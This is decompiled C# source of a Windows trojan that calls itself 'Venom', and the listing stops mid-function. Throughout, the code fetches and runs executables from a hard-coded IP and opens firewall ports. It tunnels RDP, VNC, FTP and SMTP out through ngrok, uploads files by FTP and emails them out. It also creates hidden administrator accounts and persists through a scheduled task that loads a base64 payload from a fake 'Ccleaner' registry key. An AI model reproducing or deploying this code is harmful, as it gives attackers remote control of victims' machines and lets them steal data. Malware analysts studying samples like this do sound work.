// Decompiled with JetBrains decompiler
// Type: ᒆ藷䰈콩헣⒍榪쒷椐菹粉邀ꀥ퓱㖧鍁맯䎜
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Management;
using System.Net;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜
{
  private const string 貗䚂臹뀝깩\uF170\u2A19欄䅍赐䐁嶂\uF32B\u1802\u2DDF\uEA0DḤ㘡袌\uE219 = "Venom";
  private const string 쾸ꕨၢ抲\uEB47\uE3A3蕬Ꙁ툚\u1CFA\uEE66풞콩歳둖\u2F5D\uF8DAZ膯\u2FE9 = "Administrators Group";
  private const string 㕨췏웕츋㲉拣묰뜎Ꙏ赂砠\uEADD\uE810\uE3C8\uF604쏖莏䤝唀ꕒ = "Venom";

  public static void \uE1CE歰躑쫌︆똱桓웞풵덷鹞넎\u2606䑏ꗟ얳驧봤㙱淃(
    string fTPAddress,
    string username,
    string password,
    string filename)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "ftp.txt"));
      streamWriter.WriteLine("open ftp://" + username + ":" + password + "@" + fTPAddress + "/");
      streamWriter.WriteLine("put " + filename);
      streamWriter.WriteLine("quit");
      streamWriter.Close();
    }
    catch (Exception ex)
    {
      Console.WriteLine("Exception: " + ex.Message);
    }
    finally
    {
      Console.WriteLine("Executing finally block.");
    }
  }

  public static void 䭲虨檯腺叓ផ祈ԃㅻ髇숑\uE4A4鲊媪\uE65B뭥䁵셖\u2662\uFFFD(
    string fTPAddress,
    string username,
    string password,
    string zipName)
  {
    FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(fTPAddress + "/" + Path.GetFileName(zipName));
    ftpWebRequest.Method = "STOR";
    ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(username, password);
    ftpWebRequest.UsePassive = true;
    ftpWebRequest.UseBinary = true;
    ftpWebRequest.KeepAlive = false;
    FileStream fileStream = System.IO.File.OpenRead(zipName);
    byte[] buffer = new byte[fileStream.Length];
    fileStream.Read(buffer, 0, buffer.Length);
    fileStream.Close();
    Stream requestStream = ftpWebRequest.GetRequestStream();
    requestStream.Write(buffer, 0, buffer.Length);
    requestStream.Close();
    int num = (int) MessageBox.Show("Uploaded Successfully");
  }

  public static void 佈ꬭ팢\uE0B0拓얡ࡍ䱱ﳠ酦탛焮菻\uE546硖谾댆\uEE23귓杦(string txt, string token)
  {
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.ἅ奥\uF342ﵹ豓ꋼ憎竭蕖Բ䡳蓛竴㱽\u257A縋옭\uE71Bර\u2BFF();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.㞭\uF3E7兟Š〣뚾碂䪆瀏䉖幝냘簾\uE126飛\u31D8\uFF3E\uFFFD繿\uFFFD(token);
    Thread.Sleep(20000);
    string str1 = Path.Combine(Path.GetTempPath());
    new WebClient().DownloadFile("http://91.134.207.16/WinSCP.exe", Path.Combine(Path.GetTempPath(), "WinSCP.exe"));
    string fileName = Path.Combine(Path.GetTempPath(), "WinSCP.com");
    new WebClient().DownloadFile("http://91.134.207.16/WinSCP.com", fileName);
    Thread.Sleep(20000);
    StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "upload.bat"));
    streamWriter.WriteLine("cd " + str1);
    streamWriter.WriteLine(fileName + "  /script=ftp.txt");
    streamWriter.Close();
    Thread.Sleep(20000);
    string str2 = Path.Combine(Path.GetTempPath(), "upload.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str2,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Thread.Sleep(40000);
    string str3 = Path.Combine(Path.GetTempPath(), "upload.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str3,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Thread.Sleep(40000);
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.砓똠掳\uFFFD拫댑ꦧ\u2904躧꼧耆뵁鹇Ⰸ廘砭䉑䴯윏햯();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.㶵㵽\uF207繈줗Ⴐ鼠\uFFFD幄ृ\u3368ኖ믖͇㒏賃\uFFFD徏쓥鈊();
  }

  public static void 谛槐翕櫕坉ꇧ\u2EBD쇶\u2EEC鑾裏\uF54E\uF188堥㑰㲬忦\uFFFD䮏㔩(
    string filepath,
    string email,
    string toemail,
    string password)
  {
    Process.Start(Path.Combine(Path.GetTempPath(), "blatinst.exe"));
    Thread.Sleep(5000);
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "blat.bat"));
      string str1 = Path.Combine(Path.GetTempPath(), "blat.exe");
      streamWriter.WriteLine(str1 + " -install smtp.gmail.com -u " + email + " -pw " + password);
      streamWriter.WriteLine(str1 + " -s Velos Report -to " + toemail + " -f " + email + " -body Files -attach " + filepath);
      streamWriter.Close();
      Thread.Sleep(5000);
      string str2 = Path.Combine(Path.GetTempPath(), "blat.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str2,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      }).WaitForExit();
      Thread.Sleep(40000);
      \uEEA2抜鶘需謺ꍴ\uFFFD㛴ꆲ푐\uFFFDᯏᚇ䕫\uE44B᳥꤭虰\uE997ᆳ.돂攘饄큿㙶坄랾絔뒖ㄈ豹\u061D븨इ㗜\uFFFD鸜\u267Bꢺ㖪();
    }
    catch (Exception ex)
    {
    }
  }

  public static void ἅ奥\uF342ﵹ豓ꋼ憎竭蕖Բ䡳蓛竴㱽\u257A縋옭\uE71Bර\u2BFF()
  {
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP1 dir=in action=allow protocol=TCP localport=21 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP1 dir=out action=allow protocol=TCP localport=21 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP2 dir=in action=allow protocol=TCP localport=25 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP2 dir=out action=allow protocol=TCP localport=25 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=Submission dir=in action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=Submission dir=out action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTPS dir=in action=allow protocol=TCP localport=465 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTPS dir=out action=allow protocol=TCP localport=465 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=IMAP dir=in action=allow protocol=TCP localport=993 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=IMAP dir=out action=allow protocol=TCP localport=993 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3S dir=in action=allow protocol=TCP localport=995 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3S dir=out action=allow protocol=TCP localport=995 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3 dir=in action=allow protocol=TCP localport=110 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3 dir=out action=allow protocol=TCP localport=110 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=ESMTP dir=in action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=ESMTP dir=out action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SSH_IN dir=in action=allow protocol=TCP localport=22 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SSH_OUT dir=out action=allow protocol=TCP localport=22 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
  }

  public static void 䫣\u2152\u2616ꀱ㾦ਦꁆ\uF4FA悇\u26D8䣦\uEF51㔩눍繜룧暵ō\uA704ᩬ(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "fixemail.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  587 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "fixemail.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
    }
    catch (Exception ex)
    {
    }
  }

  public static void 㞭\uF3E7兟Š〣뚾碂䪆瀏䉖幝냘簾\uE126飛\u31D8\uFF3E\uFFFD繿\uFFFD(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "fixftp.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  21 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "fixftp.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
    }
    catch (Exception ex)
    {
    }
  }

  public static void 砓똠掳\uFFFD拫댑ꦧ\u2904躧꼧耆뵁鹇Ⰸ廘砭䉑䴯윏햯()
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName("ngrok"))
        process.Kill();
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show(ex.Message);
    }
  }

  public static void 黿愭쌸蟎\u0008ꡑ錛ŧ詙᱑烍睽\uFBD0啕늍익\uEFA8声骟橜()
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName("winvnc"))
        process.Kill();
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show(ex.Message);
    }
  }

  public static void \uEFE2\u2606偊ࣲፈ噂팁\u2875뒿ꪙ핈爖ښ禸譚\uF5E5\uFFFD\u2F9E\uE78Fﳃ(string code)
  {
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Ccleaner", true);
    if (registryKey == null)
      Registry.CurrentUser.CreateSubKey("Software\\Ccleaner").SetValue("Ccleaner", (object) code);
    else if (registryKey.GetValue("Ccleaner") == null || !registryKey.GetValue("Ccleaner").ToString().Equals(code, StringComparison.CurrentCultureIgnoreCase))
    {
      registryKey.SetValue("Ccleaner", (object) code);
    }
    else
    {
      string str = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software\\Ccleaner\\).Ccleaner)).EntryPoint.Invoke($Null,$Null)";
      Process.Start(new ProcessStartInfo()
      {
        FileName = "schtasks",
        Arguments = "/create /sc minute /mo 1 /tn Ccleaner /tr \"" + str + "\"",
        CreateNoWindow = true,
        ErrorDialog = false,
        WindowStyle = ProcessWindowStyle.Hidden
      });
    }
  }

  public static void 쳠陨\u2761㧬\uF5D5ꩶ咸\uEAB7枵ⶥ\u1719\uEA9B䔼㚍㓛䇆\uE834硔䥡\uE0B6()
  {
    try
    {
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.㶵㵽\uF207繈줗Ⴐ鼠\uFFFD幄ृ\u3368ኖ믖͇㒏賃\uFFFD徏쓥鈊();
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.䢈槈\uFFFD\uF6A8䀏\uE09B䇍ゑ鼩䣴욖\u2854暀\uE0FC墤턎ꨘ\uEB34閽睉();
      string str = "Venom";
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.롓\uA4BAꃓ턺ⴔ餭귳ᑅ텐㐟ꄆ\uE57Dﷆ\u19FB\uE595鈘西ΐ㗊썮(str);
      깇꺔篼뺚砷ꌽ矡팯줬爒Ꭴ혻\uE7F6ᕢ\uE829\u2850㣱ㅰލộ.\uE8D5\uFFFD圃鱿\u1978嫉Ց城㻄餤渃༹\uF2EC\uE99FṴ뽁梬\uFFFD\u9FF0\uE98F(str);
      Thread.Sleep(20000);
      string fileName1 = Path.Combine(Path.GetTempPath(), "installrdp.exe");
      new WebClient().DownloadFile("http://91.134.207.16/rdpinstall.exe", fileName1);
      Process.Start(fileName1);
      Thread.Sleep(20000);
      string fileName2 = Path.Combine(Path.GetTempPath(), "autoupdate1.exe");
      new WebClient().DownloadFile("http://91.134.207.16/autoupdate1.exe", fileName2);
      Process.Start(fileName2);
      Thread.Sleep(20000);
      string fileName3 = Path.Combine(Path.GetTempPath(), "autoupdate2.exe");
      new WebClient().DownloadFile("http://91.134.207.16/autoupdate2.exe", fileName3);
      Process.Start(fileName3);
      Thread.Sleep(20000);
      string fileName4 = Path.Combine(Path.GetTempPath(), "updaterdp.exe");
      new WebClient().DownloadFile("http://91.134.207.16/update.exe", fileName4);
      Process.Start(fileName4);
      Thread.Sleep(10000);
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
    }
    catch
    {
    }
  }

  public static void \u0DFE︄뫘譛क़\uFFFD\uFFFD\u0A7D\u2A03墉뜳ʹᯪ얧\u0CCE\uF007ค\uEA79䌉濊()
  {
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.㶵㵽\uF207繈줗Ⴐ鼠\uFFFD幄ृ\u3368ኖ믖͇㒏賃\uFFFD徏쓥鈊();
    Thread.Sleep(15000);
    StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "dvnc.bat"));
    streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
    streamWriter.WriteLine("set exeFile=%TEMP%\\Install.exe");
    streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
    streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/Install.exe','%exeFile%');");
    streamWriter.Close();
    string str1 = Path.Combine(Path.GetTempPath(), "dvnc.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str1,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    string str2 = Path.Combine(Path.GetTempPath(), "Install.exe");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str2,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Thread.Sleep(30000);
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.㶵㵽\uF207繈줗Ⴐ鼠\uFFFD幄ृ\u3368ኖ믖͇㒏賃\uFFFD徏쓥鈊();
  }

  public static void 巕\u169BᖵǑ므ꌤ䲀ᇝᨌ蠎悔ᕜ莃鋔\uF5C6\u26B2꣓\u24D6檆菒(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "rdp.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  3389 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "rdp.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
      Thread.Sleep(30000);
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.頟喑ꈃ웩㲂尚\u2EEC溆\uF082\uEE61ﶍ\u2431瀘埫脂抔ꋟꑕ\uE43C꣮();
    }
    catch (Exception ex)
    {
    }
  }

  public static void 折ꮑ淺ꂖ풖閳혽籈\uAA3D阭쐪巌\uFFFD㾗\uF216쫒Ⅾ齞觉橉(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "vnc.bat"));
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  5900 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "vnc.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
      Thread.Sleep(10000);
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.頟喑ꈃ웩㲂尚\u2EEC溆\uF082\uEE61ﶍ\u2431瀘埫脂抔ꋟꑕ\uE43C꣮();
    }
    catch (Exception ex)
    {
    }
  }

  public static void 頟喑ꈃ웩㲂尚\u2EEC溆\uF082\uEE61ﶍ\u2431瀘埫脂抔ꋟꑕ\uE43C꣮()
  {
    string fileName = Path.Combine(Path.GetTempPath(), "getrdp.exe");
    new WebClient().DownloadFile("http://91.134.207.16/getrdp.exe", fileName);
    Process.Start(fileName).WaitForExit();
    Thread.Sleep(20000);
    string str1 = Path.Combine(Path.GetTempPath());
    StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "geturl.bat"));
    streamWriter.WriteLine("cd " + str1);
    streamWriter.WriteLine("curl.exe --silent http://127.0.0.1:4040/api/tunnels | jq.exe .tunnels[0].public_url | FindStr tcp: >> url1.txt");
    streamWriter.Close();
    Thread.Sleep(5000);
    string str2 = Path.Combine(Path.GetTempPath(), "geturl.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str2,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    string path = Path.Combine(Path.GetTempPath(), "url1.txt");
    System.IO.File.WriteAllText(Path.Combine(Path.GetTempPath(), "url.txt"), System.IO.File.ReadAllText(path).Replace('"', ' '));
    Thread.Sleep(40000);
  }

  public static void \u27CAỈ批力诌\uE7AE劥싀藲掾鬇\u4DED谔芥滒\uFFFD쨸ᡤᐥ彔(string username)
  {
    try
    {
      DirectoryEntry directoryEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
      DirectoryEntry entry = directoryEntry.Children.Find(username, "user");
      directoryEntry.Children.Remove(entry);
      entry.Close();
      directoryEntry.Close();
    }
    catch (Exception ex)
    {
      throw ex;
    }
  }

  public static bool 腀맽삳쒟흪\uEF4Bᜥꭎ蠫攊堎\u2AC0物\uAAD4㿉藌\u1CC1Ⲗ\u10CB驃(string name)
  {
    ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c net user " + name + " /delete");
    processStartInfo.CreateNoWindow = true;
    processStartInfo.RedirectStandardOutput = true;
    processStartInfo.RedirectStandardError = true;
    processStartInfo.UseShellExecute = false;
    Process process = new Process();
    process.StartInfo = processStartInfo;
    process.Start();
    string end = process.StandardOutput.ReadToEnd();
    process.WaitForExit();
    return end != "" && end.ToLower().Contains("command completed successfully.");
  }

  public static bool ꄏ萄\u2AC3추壳\uA4CB촰ጾ鵧颡\uFFFD鑢\uFFFD්\uE9F3ﺩ摉壡\u2522\uFFFD(string name)
  {
    ProcessStartInfo processStartInfo1 = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
    processStartInfo1.CreateNoWindow = true;
    processStartInfo1.RedirectStandardOutput = true;
    processStartInfo1.RedirectStandardError = true;
    processStartInfo1.UseShellExecute = false;
    Process process1 = new Process();
    process1.StartInfo = processStartInfo1;
    process1.Start();
    string end1 = process1.StandardOutput.ReadToEnd();
    process1.WaitForExit();
    if (!(end1 != "") || !end1.ToLower().Contains("command completed successfully."))
      return false;
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators " + name + " /add");
    processStartInfo2.CreateNoWindow = true;
    processStartInfo2.RedirectStandardOutput = true;
    processStartInfo2.RedirectStandardError = true;
    processStartInfo2.UseShellExecute = false;
    Process process2 = new Process();
    process2.StartInfo = processStartInfo2;
    process2.Start();
    string end2 = process2.StandardOutput.ReadToEnd();
    process2.WaitForExit();
    return end2 != "" && end2.ToLower().Contains("command completed successfully.");
  }

  public static string \uA8C0䅅\uE43D訧䱀놧뗃鵟㢼膽㵯ꟷǳꩯ\u1F58쬨粈\u085E\u2990Ὲ()
  {
    string str = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ";
    StringBuilder stringBuilder = new StringBuilder();
    Random random = new Random();
    for (int index1 = 1; index1 <= 10; ++index1)
    {
      int index2 = random.Next(0, str.Length);
      char ch = str[index2];
      stringBuilder.Append(ch);
    }
    return stringBuilder.ToString();
  }

  public static void 롓\uA4BAꃓ턺ⴔ餭귳ᑅ텐㐟ꄆ\uE57Dﷆ\u19FB\uE595鈘西ΐ㗊썮(string user)
  {
    switch (Environment.OSVersion.Version.Major)
    {
      case 5:
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey1 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        registryKey1.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey1.SetValue("DWORD", (object) 2);
        registryKey1.Flush();
        string identityValue1 = "Venom";
        string newPassword1 = "Venom";
        PrincipalContext context1;
        try
        {
          Console.WriteLine("Building System Information");
          context1 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context1, identityValue1) != null)
        {
          Console.WriteLine(identityValue1 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user1 = new UserPrincipal(context1);
        user1.Name = identityValue1;
        user1.DisplayName = "Venom Administrative User";
        user1.PasswordNeverExpires = true;
        user1.SetPassword(newPassword1);
        user1.Enabled = new bool?(true);
        try
        {
